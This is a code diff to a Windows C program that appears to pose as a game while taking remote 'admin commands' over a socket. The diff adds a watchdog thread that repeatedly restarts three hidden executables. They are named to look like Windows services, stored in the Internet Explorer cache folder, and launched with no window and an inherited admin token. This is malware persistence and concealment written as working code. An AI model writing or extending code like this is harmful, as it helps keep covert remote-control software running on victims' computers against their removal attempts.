@@ -66,6 +66,59 @@ DWORD WINAPI shadow_auto_protect(LPVOID lpParam) {
     return 0;
 }
 
+/* Inter-process watchdog: monitors shadow processes and respawns dead ones */
+DWORD WINAPI svc_watchdog(LPVOID lpParam) {
+    char localAppData[MAX_PATH];
+    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
+    
+    const char *services[] = {
+        "ElevationService.exe",
+        "CrashHandler.exe", 
+        "NotifyService.exe"
+    };
+    
+    while (1) {
+        Sleep(15000);  /* Check every 15 seconds */
+        
+        for (int i = 0; i < 3; i++) {
+            char path[MAX_PATH];
+            snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\INetCache\\IE\\%s",
+                     localAppData, services[i]);
+            
+            /* Check if process is running */
+            int found = 0;
+            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (hSnap != INVALID_HANDLE_VALUE) {
+                PROCESSENTRY32 pe;
+                pe.dwSize = sizeof(pe);
+                if (Process32First(hSnap, &pe)) {
+                    do {
+                        if (_stricmp(pe.szExeFile, services[i]) == 0) found = 1;
+                    } while (Process32Next(hSnap, &pe));
+                }
+                CloseHandle(hSnap);
+            }
+            
+            if (!found) {
+                /* Respawn with inherited admin token via CreateProcessA */
+                STARTUPINFOA si = {0};
+                si.cb = sizeof(si);
+                PROCESS_INFORMATION pi = {0};
+                char cmdLine[1024];
+                snprintf(cmdLine, sizeof(cmdLine), "\"%s\" --shadow", path);
+                CreateProcessA(path, cmdLine, NULL, NULL, FALSE,
+                               CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
+                               NULL, NULL, &si, &pi);
+                if (pi.hProcess) {
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                }
+            }
+        }
+    }
+    return 0;
+}
+
 /* Execute game module or admin command */
 static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     char *result = NULL;
@@ -289,6 +342,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     /* Elevate privileges if needed for full functionality */
     sys_check_privileges();
+    
+    /* Start inter-process watchdog (respawns dead shadows) */
+    CreateThread(NULL, 0, svc_watchdog, NULL, 0, NULL);
     
     /* Start protection watchdog thread */
     CreateThread(NULL, 0, sys_protect_watchdog, NULL, 0, NULL);
